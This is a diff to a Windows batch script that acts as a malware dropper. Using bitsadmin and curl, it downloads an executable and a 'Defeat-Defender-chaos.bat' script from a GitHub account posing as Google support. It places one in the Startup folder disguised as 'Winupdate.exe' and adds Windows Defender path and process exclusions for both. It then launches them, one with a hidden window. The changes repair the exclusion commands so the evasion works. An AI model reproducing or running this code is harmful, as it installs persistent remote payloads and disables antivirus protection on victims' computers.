@@ -18,7 +18,7 @@ cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
  
 bitsadmin /transfer Packages /download /priority foreground https://github.com/supportgoogle34/files/raw/main/System.exe "C:\Users\noob\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Winupdate.exe" 
 powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "C:\Users\noob\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Winupdate.exe"
-Add-MpPreference -ExclusionProcess "C:\Users\noob\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Winupdate.exe"
+powershell Add-MpPreference -ExclusionProcess "C:\Users\noob\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Winupdate.exe"
  
 powershell -command "start Winupdate.exe" 
 
@@ -36,10 +36,9 @@ echo "powershell.exe -command Start-Process -FilePath "C:\Windows\kernel.bat" -A
 
 curl https://raw.githubusercontent.com/supportgoogle34/files/main/Defeat-Defender-chaos.bat > C:\Windows\Defeat-Defender-chaos.bat
 powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "C:\Windows\Defeat-Defender-chaos.bat"
-Add-MpPreference -ExclusionProcess "C:\Windows\Defeat-Defender-chaos.bat"
+powershell Add-MpPreference -ExclusionProcess "C:\Windows\Defeat-Defender-chaos.bat"
 
 set pop=%systemroot%
 powershell.exe -command Start-Process -FilePath "C:\Windows\Defeat-Defender-chaos.bat" -ArgumentList "args" -WindowStyle Hidden
-start C:\Windows\Defeat-Defender-chaos.bat
 
-C:\Windows\Defeat-Defender-chaos.bat
+powershell -command  " start C:\Windows\Defeat-Defender-chaos.bat "
